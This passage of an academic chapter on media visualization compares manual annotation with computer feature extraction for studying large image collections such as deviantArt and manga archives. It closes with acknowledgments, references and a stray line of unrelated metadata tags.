+rating scales, all these techniques for adding new information to a media collection manually
+has two crucial limitations. The first limitation is that they don’t work well with really large data
+sets. While annotating every shot of a feature film can be done in one day by a single person,
+imagine annotating seven billion photographs uploaded by Facebook users every month (as of
+early 2012) will be a real challenge if with Amazon Mechanical Turk crowdsourcing. (In the
+industry, some companies are able to successfully annotate large media data sets by dedicating
+a large stuff. For example, Pandora music recommendation engine relies on a team which rates
+each new song using 400 different attributes; after 10 years in business, it had a database of
+
+## 14
+800,000 songs.
+## 19
+A recent newcomer recommendation engine for art Art.sy is rumored to
+employ a large stuff of recent art and art history graduates who describe each artwork using a
+set of 800 attributes.
+## 20
+## )
+
+The second limitation is using one semiotic system (natural languages) to describe a nother
+(visual media). Developing much later than senses, language complements what they do very
+well (capturing analog signals, differentiating between fine gradations in these signals). It allows
+thinking about particular and general, describing temporal relations, forming abstract categories,
+and differentiating between qualities  – but it does not try to compete with the senses that are so
+good in capturing quantitative distinctions. Therefore, words that exist in natural languages to
+describe media aesthetics are quite limited. They can’t describe the full range of variations
+color, texture, composition, rhythm, movement and all other analog dimensions of media. This
+has particular consequences for research into aesthetics of visual media, which today more
+than ever relies on the distinctions on these dimensions. (After abstract visual language is
+formulated in 1910s art, it is adopted in    more and more domains –graphic design, industrial
+design, and architecture in 1920s, and later fashion, motion graphics, web design and UI
+design.)
+
+The scale limitations mean that the manual annotation method would not work for researching
+the aesthetics of user-generated media if we don’t want to limit ourselves to very small samples
+but consider patterns across large data sets (dA network contain the “modest” number 150+
+million images). It can, however, work with small collections of art from the past (for instance,
+BBC Your Paintings digital archive of 200,000 paintings in UK museums
+## 21
+). However, the
+second limitation is always present, regardless of the size of a collection.
+
+Instead of manual annotations, we can use well-established computer techniques to
+automatically process and extract information about images and video. These techniques are
+used in the fields of i mage processing, and computer vision, and many research areas such as
+content-based image search, video summarization, video fingerprinting, and others. Some of
+these techniques are known to media users –   for example, face detection in iPhoto and
+Facebook, or smile detection used digital cameras. Other techniques remain invisible,  but they
+form the foundation of digital media culture, as they are built in all digital media devices and
+applications. For example, when you take a picture with a digital camera using automatic
+setting, the software in the camera chip first analyzes   light information captured by the image
+sensor, measuring gray and color values of every pixels, and then algorithmically adjusts   these
+values to produce the image with the best contrast.
+
+The difference between these two fundamental methods of augmenting data is    not just a matter
+of procedure: creating new information manually or via computer image processing.  The two
+also represent two different ways of understanding media.  When we tag or annotate, its logical
+
+## 19
+Eric Shonfeld, "With 80 Million Users, Pandora Files To Go Public". TechCrunch, 2/11/2011,
+http://techcrunch.com/2011/02/11/pandora-files-to-go-public/.
+## 20
+“About,” art.sys,
+http://art.sy/about.
+## 21
+BBC Your paintings,
+http://www.bbc.co.uk/arts/yourpaintings.
+
+## 15
+to describe this process as adding additional information to the media. We can also say that we
+are adding new metadata to already existing metadata.
+
+In Computer Science, the process of automatically analyzing images and video is called feature
+extraction.
+## 22
+The assumption is that computer automatically and objectively extracts the
+information that is already present in the images or video. The features are the statistics
+summarizing different types of information that can be calculated from all the pixels making up
+an image. Examples include average brightness, saturation and hue, number of edges and their
+orientations, the positions of corners, and hundreds of others. In the case of video, in addition to
+analyzing visual properties of every frame, temporal features such as the positions of cuts and
+other types of transitions between shots are also extracted (this process is called cuts
+detection).
+
+In practical applications such as content-based image search (searching images by their
+content which in this context means both the objects in images and their visual elements such
+as dominant colors), hundreds of features are extracted to provide a comprehensive and yet
+compact representation of every image.  Note that while it if well known that the choice of
+features has crucial effect on the success of a particular application, there is no general theory
+that would specify which features are to be used in different cases, so the choice of features
+depends on the experience of the researchers.
+
+
+The two approaches –   manual annotation and automatic analysis to extract features -  have
+complementary strengths. While computers can capture the fine details of visual form, it is very
+difficult for them to understand the representational content of media (what images represent) -
+but humans can do it easily. Given an arbitrary image, we immediately detect any objects in it
+that have recognizable names (face, sky, house, car, etc.)
+
+In their turn, natural languages   can’t capture the small differences on the visual non-narrative
+dimensions. For instance, try to describe using words movement patterns in tens of thousands
+of motion graphics works on behance.com, or other design portfolio sites.
+## 23
+While our brain can
+certainly compute such fine differences -  over wise they would not be used universally in    visual
+art and media -   the results of these computations that drive our aesthetic and emotional
+responses to visual media are not accessible to the language system.
+
+Instead of small numbers of linguistic categories, computers describe the details of visual form
+using real numbers. For example, let’s say that we want to measure average brightness of an
+image. In consumer digital media brightness values are typically represented using the 256
+value scale (i.e. one byte). Every pixel in an image has a gray scale value between 0 (pure
+black) and 255 (pure white). To measure average brightness, we add the gray scale values of
+
+## 22
+See, for example, Mark Nixon and Alberto Aguado, Feature Extraction & Image Processing
+for Computer Vision, 3
+rd
+edition, (Academic Press,  2012).
+## 23
+Motion graphics projects gallery on behance.net, http://www.behance.net/?field=63.
+
+## 16
+every pixel and divide them by the total number of pixels. The result is a real number (i.e.
+129.54, or 178,51, etc.). Which means that our measurement scale is infinite. But even if we
+round off these numbers, we will still have s scale of 256 distinct values describing average
+brightness –   which obviously provides with a much more nuanced system than the few terms
+available in English language (dark, medium, light).
+
+In the same way, we can use numerical scale to characterize orientations of all lines in an
+image, its most prominent colors, the size and positions of all distinct shapes, and hundreds of
+other characteristics.
+
+Since the two methods (manual annotation and feature extraction) complement one another, we
+can combine them in studying massive media data sets. For example, in our deviantArt analysis
+project, we run image processing software on the whole set of one million images, extracting
+various features from every image.  We also selected a small sample of a few hundred images
+and tagged it manually, describing characteristics of images that computers can’t capture.
+
+
+Media visualizations using extracted features
+
+While the features extracted from media collections can be explored using standard information
+visualization techniques such as histograms and scatter plots, they can be also used together
+with media visualization method. For example, we can sort all images according to a particular
+visual feature, and then render a collection montage visualization using the sorted sequence.
+We can also create a two dimensional scatter plot by mapping individual features to horizontal
+and vertical axis, and then render the images on top of the points. We find this type of
+visualization to be particularly useful, and we call it image plot.
+## 24
+
+
+Image plots allow us to compare different image collections (or subsets of a single collection)
+along various visual dimensions. As an example, figure 4   shows an image plot that compares
+equal size samples of images from Traditional and Digital Art categories in our deviantArt
+sample.
+
+## [  INSERT FIGURE 4 HERE ]
+[ Imageplot comparing Traditional and Digital Art categories in deviantArt sample ]
+
+Our method of extracting visual features and then using them for media visualization draws
+upon existing practices in computer science –   but there is one crucial difference. In computer
+science applications of image processing such as computer vision, content-based image search
+and image classification, single extracted visual features are never used by themselves.
+
+## 24
+While the similar technique has been previosly described in a number of computer science
+publications, it has not beem implemented in any free or commercial software. Therefore, we
+developed a free software tool ImagePlot. It allows rendering of high resolution visualizations
+which can show very large image collections. The tool and documentation are available from
+http://lab.softwarestudies.com/p/imageplot.html.
+
+## 17
+Instead, hundreds of features are combined together in the hope of creating a unique
+“signature” for every image. If, for instance, a user wants to find all images a database similar to
+a particular image, the computer compares the signatures of the input image to the signatures
+of all other in the database images, and returns the images that have most similar signatures.
+(Google “search similar images” features introduced in 2009 is implemented in the similar
+way.
+## 25
+## )
+
+This approach can be also used for media research -  for instance, to identify all faces in a
+museum collection. However, only using computers   to analyze media according to our a priori
+linguistic categories which can only label types of content (“people,” “faces,” etc.)   does not use
+its other powerful capacity –   exploring big data to see what is there, and having this exploration
+problematize our default understanding and assumptions. And if we want to start with a free
+exploration of a collection to see all kinds of patterns it can contain, or comparison between its
+parts, a much simpler technique is sufficient. While many of the features that can be extracted
+from images are not meaningful to a human observer (for instance, gray scale differences
+between neighborhood pixels used to characterize texture), some of them do have direct
+perceptual meaning. The examples of such features are contrast, the most frequently used
+colors, or average brightness and average saturation used in visualization in Fig. 5.
+
+This simple but powerful technique combined with an image plot technique is our answer for
+how to explore image collections. The images in a collection are sorted along the dimensions
+defined by perceptually meaningful features. The method is simple enough so it can be taught in
+a single session, and it has been successfully used by my undergraduate students in a number
+of classes. (Obviously, we can also use existing or newly added semantic metadata in
+combination with image plot –   as, for example, in fig. 5 which compares two subsets of our
+deviantArt collection using existing category information.)
+
+It is certainly also possible to combine single visual features to arrive at more “high-level”
+dimensions of visual form –   for instance, “calm/dynamic,” or “flat/three-  dimensional.” However,
+doing this is not trivial.
+## 26
+It is not apriori clear what features best characterize such high-level
+dimensions, or what is the right way to combine them. In computer vision and related fields,
+researchers use the term “semantic” gap to describe the distance which needs to be overcomes
+between what computer can see -  features extracted from pixel values -  and the content and
+meaning an of image as perceived by a human. More recently, scientists   introduced a related
+term “emotional gap” defined as ““the lack of coincidence between the measurable signal
+properties, commonly referred to as features, and the expected affective state in which the user
+
+## 25
+
+http://www.google.com/insidesearch/features/images/searchbyimage.html;
+http://support.google.com/images/bin/answer.py?hl=en&p=searchbyimagepage&answer=13258
+## 08.
+## 26
+For an example of such research, see the the following paper which investigates how low-
+level features can be used to describe empotional content of images: Jana Machajdik, Allan
+Hanbury, “Affective image classification using features inspired by psychology and art theory.”
+MM '10 Proceedings of the international conference on Multimedia (ACM, 2010), pp. 83-92.
+
+## 18
+is brought by perceiving the signal.”
+## 27
+Similarly, we can talk about “media aesthetics gap” –   the
+distance between such low-level features and human judgments of visual form in media
+artifacts.
+
+
+## Museum Without Walls,  Art History Without Names
+
+In this chapter I looked at some of the key concepts and operations involved in the use of
+visualization for media analysis. These concepts are artifact, data, metadata, feature, mapping,
+and remapping. These concepts are basic building blocks that can be combined to form the
+methods that can all take us from the artifacts to their visualizations -  but in different ways and
+with different outputs supporting different types of questions.
+
+Once media artifacts are translated into digital data, we can decide what will be visualized.
+Traditional information visualization techniques are useful for exploring patterns in    metadata that
+comes with these artifacts, new metadata manually added by researchers, or the features
+automatically extracted from the data representations. Media visualizations techniques originally
+pioneered by media and digital artists and further developed in our lab allow us to explore the
+patterns in images and video data itself by displaying whole collections sorted in a variety of
+ways. These techniques offer one solution to the fundamental question of digital  humanities –
+how to brings together macro and micro, distant reading and close reading.
+
+While natural languages are powerful tools for describing representational and narrative content
+of media, they do not work as well to describe visual form. In contrast, computers can use large
+numerical scales to capture nuances of form in a much more precise way. Combined with the
+massive media data sets now available (both digitized visual media created before 21
+st
+century,
+and born-digital contemporary media created by both professionals and non-professional
+users), this opens the door to the amazing research possibilities. Rather than only relying on
+small samples as media researchers did in the 20
+th
+century, we can now map histories of media
+aesthetics and also explore the patterns in contemporary media production, sharing and remix
+by analyzing billions of artifacts.
+
+Following up on his idea of an imaginary “museum without walls” made possible by
+photographic reproductions of artworks, André Malraux’s included 638 photographs of artworks
+in his book Voices of Silence which appeared in English translation in 1953. This was certainly a
+pioneering work for its time. Using media visualization, such a sample today can be expanded
+many times, with the numbers of images only limited by what has been digitized and what has
+been made available by the museums and other collections –   or what can be scraped from the
+web. (To assemble our collection of almost 6000 images of Impressionist works that represents
+approximately half of the estimated number of paintings and pastels created by these artists, we
+scraped a number of different web sites and combined the results. For our manga project, we
+scraped over one million manga pages from the most popular fan manga web site together with
+
+## 27
+A. Hanjalic, “Extracting moods from pictures and sounds: Towards truly personalized TV,”
+IEEE Signal Processing Magazine 23(2), 90–100 (2006).
+
+## 19
+fan assigned categories.) By interactively sorting the images using both existing metadata and
+extracted features, displaying them in different layouts, and overlaying other historical
+information, we can explore their relations in ways which go   beyond simple side by side
+comparison of a 20
+th
+century slide lecture.
+
+This basic technique of 20
+th
+century art history   was introduced by the art history Heinrich
+Wölfflin (1864-1945) a fter he became Art History Chair at Basel in 1897. He developed a
+teaching method of using two projectors positioned side by side in art history lectures to allow
+simultaneous display and comparisons of pairs of images.  But this is not the only relevance of
+Wölfflin for our discussion. The introduction to his classical 1915 book Kunstgeschichtliche
+Grundbegriffe ( "Principles of Art History") was called “Art History Names.”  This title reflects the
+ambition of art history founders -  Wölfflin, Riegl, Panofsky  -   to analyze broad patterns of
+historical changes in visual representation and form on the scale of thousands of years
+manifested in all of the artifacts which were produced, without limiting these investigations to
+small sets of only important “art” objects.  In Principles of Art History, Wölfflin writes:
+
+As every history of vision must lead beyond mere art, it goes without saying that such
+national differences of the eye are more than a mere question of taste; conditioned and
+conditioning, they contain the bases of the whole world picture of people. That is why the
+history of art as the doctrine of the modes of vision can claim to be, not only a mere
+super in the company of historical disciplines, but as necessary as sight itself (1932
+[1915], p. 237).
+## 28
+
+
+The broad “history of vision” advocated by Wölfflin and his contemporaries is certainly an
+inspiration for the use of computational analysis and visualization together with massive media
+collections. However, its crucial to keep in mind that this generation of researchers was limited
+not only by their samples and techniques of comparison, but also by the intellectual paradigms
+which made them read cultural artifacts as expressions of the unique characteristics describing
+“spirit,” “mentalities,” and “world picture” of different “nations.”
+
+Today, a different “art history without names” became possible – think of many millions of user-
+generated media artifacts and the opportunity they offer for the study of contemporary human
+imaginations,  including both their “content” and the patterns of imitation, diffusion and innovation
+on a global scale. Media visualization methods allow us to explore such massive collections
+without a priori reducing them to small number of categories as Wölfflin and others had to do.
+And rather than assuming that media created by users which have similar demographic profiles
+has something in common (to translate Wölfflin’s assumptions in contemporary terms), we can
+instead use the combination of feature extraction and media visualization to find clusters of
+similar media objects, and then see if they correspond to user demographics or any other
+existing categories.
+
+
+## 28
+Quoted in Michael Hatt, Charlotte Klonk, Art History: A Critical Introduction to Its Methods
+(Mancester University Press, 1998), p. 66.
+
+## 20
+Ultimately, visualization can help us to question our existing metadata labels and ways of
+dividing the objects of study, showing that that every narrative and map we construct is only one
+possibility    -  as Bruno Latour puts this, “a provisional visualization which can be modified and
+reversed at will, by moving back to the individual components, and then looking for yet other
+tools to regroup the same elements into alternative assemblages.”
+## 29
+
+
+
+
+## Acknowledgments
+
+The research presented in this chapter was supported by an Interdisciplinary Collaboratory
+Grant, “Visualizing Cultural Patterns” (UCSD Chancellors Office, 2008-2010), Humanities High
+Performance Computing Award, “Visualizing Patterns in Databases of Cultural Images and
+Video” (NEH/DOE, 2009), Digital Startup Level II grant (NEH, 2010), and CSRO grant (Calit2,
+2010). We also are very grateful to the California Institute for Information and
+Telecommunication (Calit2) and UCSD Center for Research in Computing and the Arts (CRCA)
+for their support.
+
+
+## References
+
+“About.” Art.sy. Web. <
+http://art.sy/about>.
+
+## Archive.org. Archive.org. <
+http://archive.org/web/web.php>.
+
+BBC Your paintings. Web. <http://www.bbc.co.uk/arts/yourpaintings>.
+
+Berry, David, ed. Understanding Digital Humanities. New York: Palgrave Macmillan, 2012. Print.
+
+Borgman, Christine. Scholarship in the Digital Age: Information, Infrastructure, and the Internet.
+The MIT Press, 2007.  Print.
+
+Bowker, Geoffrey. Memory Practices in the Sciences. The MIT Press, 2006. Print.
+Burdick, Anne, Johanna Drucker, Peter Lunenfeld, Todd Presner, Jeffrey Schnapp. Digital
+Humanities. Cambridge, Mass.: The MIT Press, 2012.
+
+Chang, Daniel, Yuankai Ge, Shiwei Song, Nicole Coleman, Jon Christensen, and Jeffrey Heer.
+“Visualizing the Republic of Letters.” 2009. Web.
+## <
+http://www.stanford.edu/group/toolingup/rplviz/papers/Vis_RofL_2009>.
+
+
+## 29
+Bruno Latour, Tarde’s Idea of Quantification, in    Mattei Candea, ed., The Social After Gabriel
+Tarde: Debates and Assessments ( Routledge, 2009).
+
+
+## 21
+Friendly, Michael and Daniel J. Denis. Milestones in the History of Thematic
+Cartography, Statistical Graphics, and Data Visualization. Web. <
+http://datavis.ca/milestones/;
+http://www.datavis.ca/gallery/index.php>.
+
+Gold, Matthew, ed. Debates in the Digital Humanities. Mineapolis: University Of Minnesota
+## Press, 2012. Print.
+
+Hanjalic, A. “Extracting moods from pictures and sounds: Towards truly personalized TV.” IEEE
+## Signal Processing Magazine 23(2): 90–100. 2006. Print.
+
+Hatt, Michael and Charlotte Klonk. Art History: A Critical Introduction to Its Methods. Mancester
+## University Press, 1998. Print.
+
+Hayles, Katherine. How We Think: Digital Media and Contemporary Technogenesis. Chicago:
+University of Chicago Press, 2012. Print.
+
+Nochlin, Linda. “Museum without Walls.” New York Times, May 1, 2005. Print.
+http://query.nytimes.com/gst/fullpage.html?res=9B0CE2DC1431F932A35756C0A9639C8B63.
+
+Latour, Bruno. “ Tarde’s Idea of Quantification.” The Social After Gabriel Tarde: Debates and
+## Assessments. Ed Mattei Candea. Routledge, 2010. Print.
+
+## Lima, Manual. Visual Complexity. Princeton Architectural Press, 2011. Print.
+
+## Lima, Manual. Visualcomplexity. Web. <http://www.visualcomplexity.com/vc/>.
+
+Machajdik, Jana and Allan Hanbury. “Affective image classification using features inspired by
+psychology and art theory.”   Proceedings of the 2010 international conference on Multimedia.
+ACM, 2010. Pp. 83-92. Print.
+
+Manovich, Lev. "What is visualization?" Visual Studies, 26.1 (2011): 36-49. Print.
+
+Manovich, Lev.  “Cultural Analytics: Visualizing Cultural Patterns in the Era of ‘More Media’.”
+## Milan: Domus, 2009.
+
+Manovich, Lev.  “Data Visualization as New Abstraction and Anti-Sublime.” SMAC!, 3   (2002).
+## Print. <
+http://lab.softwarestudies.com/2008/09/cultural-analytics.html>.
+
+Manovich, Lev.  “How to compare one million images?” Understanding Digital Humanities. Ed.
+## David Berry. New York: Palgrave Macmillan, 2012. Print.
+
+Manovich, Lev. “Introduction.” Visual Complexity. By Manual Lima. Princeton Architectural
+## Press, 2011. Print.
+
+Manovich, Lev. “ Media Visualization: Visual Techniques for Exploring Large Media Collections.”
+## Media Studies Futures. Ed. Kelly Gates. Blackwell, 2012.  Print.
+
+## 22
+
+Moere, Andrew Vande. “About the Information Aesthetics Weblog.” Infosthetics.com. Dec. 2004.
+## Web. <
+http://infosthetics.com/information_aesthetics_about.html>.
+
+Motion graphics projects gallery. Behance.net. Web. <
+http://www.behance.net/?field=63>.
+
+Nguyen, G. P., M. Worring, “Interactive access to large image collections using similarity-based
+visualization.” Journal of Visual Languages and Computing. 19. 2 (April 2008): 203-224. Print.
+## <h
+ttp://staff.science.uva.nl/~giangnp/Pubs/Pdf/2006/NguyenWorringJVLC06.pdf>.
+
+Nixon, Mark and Alberto Aguado. Feature Extraction & Image Processing for Computer Vision.
+## 3
+rd
+edition. Academic Press, 2012.
+
+Ramsay, Stephen. Reading Machines: Toward an Algorithmic Criticism. University of Illinois
+## Press, 2011.  Print.
+
+Schaefer, Gerald. "Interactive Navigation of Image Collections." FGIT 2011: Future Generation
+## Information Technology: Third International Conference. Springer, 2012. Print.
+
+Shonfeld, Eric. "With 80 Million Users, Pandora Files To Go Public.” TechCrunch, February 11,
+## 2011. Web. <
+http://techcrunch.com/2011/02/11/pandora-files-to-go-public/>.
+
+Software Studies Initiative. ImagePlot software. Web.
+## <
+http://lab.softwarestudies.com/p/imageplot.html>.
+
+## Software Studies Initiative. Software Studies Initiative. Web. <
+http://www.softwarestudies.com>.
+
+Viégas, Fernanda  and Martin Wattenberg. “Artistic Data Visualization: Beyond Visual
+Analytics.” Proceedings of the 2nd International Conference on Online Communities and Social
+Computing. Springer-Verlag Berlin, 2007. Print.
+## <
+http://www.research.ibm.com/visual/papers/artistic-infovis.pdf>.
+
+Yang, Jing, Jianping Fan, Daniel Hubball, Yuli Gao, Hangzai Luo, William Ribarsky. “Semantic
+image browser: Bridging information visualization with automated intelligent image analysis.”
+Proc. of 2006 IEEE Symposium on Visual Analytics Science and Technology. 2006.
+## <
+http://viscenter.uncc.edu/sites/viscenter.uncc.edu/files/CVC-UNCC-06-02.pdf>.
+
+Yau, Nathan. Visualize This: The FlowingData Guide to Design, Visualization, and Statistics.
+## Wiley, 2011.  Print.
+
+
+---
+> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, api]
 
 ### 📘 KNOWLEDGE: NEXUS_CORE_PRINCIPLES.MD
 
